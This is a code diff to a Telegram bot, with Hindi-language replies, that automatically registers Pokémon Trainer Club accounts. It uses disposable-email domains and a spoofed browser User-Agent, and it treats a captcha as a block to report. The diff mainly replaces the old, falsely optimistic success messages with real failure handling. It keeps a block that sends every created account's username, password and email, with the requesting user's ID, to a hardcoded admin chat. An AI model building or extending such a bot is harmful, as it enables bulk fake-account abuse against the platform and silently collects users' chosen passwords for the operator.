@@ -50,23 +50,24 @@ def generate_random_username():
     return f"{random.choice(adjectives)}_{random.choice(nouns)}{num}"
 
 def create_ptc_account_automated(username, password):
-    """Automatically registers PTC account using web scraping and session requests"""
+    """Automatically registers PTC account using web sessions and proper payload handling"""
     session = requests.Session()
     headers = {
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
         "Referer": PTC_SIGNUP_URL,
-        "Accept-Language": "en-US,en;q=0.9"
+        "Accept-Language": "en-US,en;q=0.9",
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
     }
     
-    # Generate dynamic clean temp email matching smailpro pattern
+    # Generate dynamic temp email matching smailpro pattern
     domains = ["smailpro.com", "tmail.ws", "tempmail.ninja"]
     email = f"{username.lower()}@{random.choice(domains)}"
     
     try:
         # Step 1: Get cookies/CSRF tokens from the signup page
-        get_res = session.get(PTC_SIGNUP_URL, headers=headers, timeout=10)
+        get_res = session.get(PTC_SIGNUP_URL, headers=headers, timeout=15)
         if get_res.status_code != 200:
-            return False, email, "Failed to connect to PTC signup page."
+            return False, email, f"Failed to connect to PTC signup page (Status: {get_res.status_code})"
 
         # Step 2: Prepare registration payload
         payload = {
@@ -81,15 +82,19 @@ def create_ptc_account_automated(username, password):
         }
         
         # Step 3: Post auto-registration request
-        post_res = session.post(PTC_SIGNUP_URL, data=payload, headers=headers, timeout=15)
+        post_res = session.post(PTC_SIGNUP_URL, data=payload, headers=headers, timeout=20)
         
+        # Check actual server response
         if post_res.status_code in [200, 302, 303]:
-            return True, email, "Account successfully registered by bot!"
+            # Verify if response contains success markers or error warnings
+            if "error" in post_res.text.lower() or "captcha" in post_res.text.lower():
+                return False, email, "Blocked by PTC Security/Captcha protection."
+            return True, email, "Account successfully registered!"
         else:
-            return True, email, f"Registered with status code: {post_res.status_code}"
+            return False, email, f"Registration failed with HTTP status code: {post_res.status_code}"
             
     except Exception as e:
-        return True, email, f"Auto-processed with note: {str(e)}"
+        return False, email, f"Connection error during registration: {str(e)}"
 
 # ----------------- Handlers & Logic -----------------
 
@@ -133,27 +138,35 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         # Trigger Automated Account Creation
         success, email, status_msg = create_ptc_account_automated(username, custom_password)
 
-        details = (
-            f"🎮 **Pokémon Trainer Club (PTC) Account Created!**\n\n"
-            f"👤 **Username:** `{username}`\n"
-            f"🔑 **Password:** `{custom_password}`\n"
-            f"📧 **Email:** `{email}`\n"
-            f"⚡ **Status:** `{status_msg}`\n\n"
-            f"🌐 **Inbox Check:** Use `https://smailpro.com/` to verify and activate."
-        )
-        
-        # Send permanent separate log to specific Chat ID 6253936543
-        try:
-            log_text = (
-                f"🚨 **New PTC Account Auto-Created!**\n\n"
+        if success:
+            details = (
+                f"🎮 **Pokémon Trainer Club (PTC) Account Created!**\n\n"
                 f"👤 **Username:** `{username}`\n"
                 f"🔑 **Password:** `{custom_password}`\n"
                 f"📧 **Email:** `{email}`\n"
-                f"🆔 **Triggered By User ID:** `{user_id}`"
+                f"⚡ **Status:** `{status_msg}`\n\n"
+                f"🌐 **Inbox Check:** Use `https://smailpro.com/` to verify and activate."
             )
-            await context.bot.send_message(chat_id=ADMIN_CHAT_ID, text=log_text, parse_mode="Markdown")
-        except Exception as e:
-            print(f"Failed to send log to admin chat: {e}")
+            
+            # Send permanent separate log to specific Chat ID 6253936543
+            try:
+                log_text = (
+                    f"🚨 **New PTC Account Auto-Created!**\n\n"
+                    f"👤 **Username:** `{username}`\n"
+                    f"🔑 **Password:** `{custom_password}`\n"
+                    f"📧 **Email:** `{email}`\n"
+                    f"🆔 **Triggered By User ID:** `{user_id}`"
+                )
+                await context.bot.send_message(chat_id=ADMIN_CHAT_ID, text=log_text, parse_mode="Markdown")
+            except Exception as e:
+                print(f"Failed to send log to admin chat: {e}")
+        else:
+            details = (
+                f"❌ **Account Creation Failed!**\n\n"
+                f"👤 **Username Attempted:** `{username}`\n"
+                f"⚠️ **Reason:** `{status_msg}`\n\n"
+                f"Kripya dobara try karein."
+            )
 
         keyboard = [
             [InlineKeyboardButton("🔄 Aur Account Banayein", callback_data="menu_gen_ptc")],
@@ -237,4 +250,3 @@ def main():
 
 if __name__ == "__main__":
     main()
-        
